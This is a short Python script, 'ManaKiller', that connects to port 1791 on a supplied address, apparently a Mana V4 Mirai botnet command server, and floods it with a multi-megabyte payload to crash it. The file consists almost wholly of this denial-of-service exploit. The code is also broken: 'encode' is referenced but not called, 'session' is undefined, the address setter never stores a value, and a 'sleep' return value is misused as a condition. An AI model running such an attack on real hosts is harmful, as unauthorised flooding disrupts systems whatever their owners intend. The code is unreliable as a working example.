from socket import socket
from time   import sleep


class ManaKiller:
    def __init__(self: object, addr: str = '0.0.0.0') -> None:
        self._addr: str = addr
        
    ############################################################
    """Property functions."""
    @property
    def addr(self: object) -> str:
        return self._addr
    

    @addr.setter
    def addr(self: object, addr: str) -> None:        
        if not isinstance(addr, str):
            raise TypeError
            
    ############################################################
    """Static methods."""
    
    @staticmethod
    def verify_mana(arch: str) -> bool | None:
        """Detect whether arch is a common 
           Mana V4 source arch.
           
            Return: bool
        """
        if [mana_arch for mana_arch in ('lmaowtf','loligang') if mana_arch in arch.lower()]:
            return True
            
    ############################################################
    """Main methods."""
    
    def exploit(self: object, attack: bool = False) -> bool:
        """OOB Mirai exploit.
        
            Return: bool | None
        """
        with socket() as sock:
            sock.settimeout(5)
            try:
                # NOTE: CNC server running.
                sock.connect((self.addr,1791))
                
                if attack:
                    # NOTE: Send payload.
                    sock.send('lmaoWTF'.join('ManaKiller'*999999).encode)
                    
                return True
            except:
                return
            
            
    def execute(self: object) -> bool | None:
        """Execute OOB exploit.
        
            Return: bool
        """
        # NOTE: Verify whether the CNC is running on port 1791.
        if session.exploit():
            # NOTE: Execute exploit.
            if session.exploit(attack = True) and sleep(2) and not session.exploit():
                return True
        